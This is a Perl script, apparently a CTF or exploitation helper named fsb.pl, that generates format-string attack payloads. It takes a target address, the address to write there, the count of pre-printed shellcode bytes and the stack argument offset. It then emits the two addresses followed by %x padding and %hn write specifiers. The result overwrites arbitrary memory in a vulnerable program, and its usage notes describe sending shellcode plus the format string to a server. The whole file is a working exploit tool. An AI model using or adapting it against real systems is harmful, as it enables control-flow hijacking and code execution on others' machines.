#!/usr/bin/perl

if ( $#ARGV + 1 != 4 ||
     $ARGV[0] !~ /^\d+$/ ||
     $ARGV[1] !~ /^0x[0-9a-fA-F]{8}$/ ||
     $ARGV[2] !~ /^0x[0-9a-fA-F]{8}$/ ||
     $ARGV[3] !~ /^\d+$/ ) {
    print "This tool makes the format for format-string.\n";
    print "   Usage  : ./fsb.pl <pre-printed bytes> <write-to-addr> <write-by-addr> <buf-argument(N-th)>\n";
    print "   Example: ./fsb.pl 28 0x0804a010 0x080486e1 20\n";
    print "\n";
    print "   param: write-to-addr, write-by-addr:\n";
    print "       The addresses that \"mem[write-to-addr] = write-by-addr\".\n";
    print "   param: pre-printed bytes:\n";
    print "       If you send \"SHELLCODE + FORMAT\" to server, length(SHELLCODE) is pre-printed bytes.\n";
    print "   param: buf-argument:\n";
    print "       In the stack, what the argument offset number is THIS BUFFER. You treat under integer(4byte=1offset).\n";
    exit(0);
}

$addr = hex($ARGV[1]);

for($i=3; $i>=0; $i--){
    print pack("H*", substr(sprintf("%08x",$addr+2), $i*2, 2));
}

for($i=3; $i>=0; $i--){
    print pack("H*", substr(sprintf("%08x",$addr), $i*2, 2));
}

$predata = $ARGV[0];

$val_a = hex(substr($ARGV[2],2,4))-8-$predata;

while( $val_a <= 0 ){
    $val_a += 65536;
}

$val_b = hex(substr($ARGV[2],6,4))-$val_a-8-$predata;

while( $val_b <= 0 ){
    $val_b += 65536;
}

print "\%" . $val_a . "x\%" . ($ARGV[3]) . "\$hn";
print "\%" . $val_b . "x\%" . ($ARGV[3]+1) . "\$hn";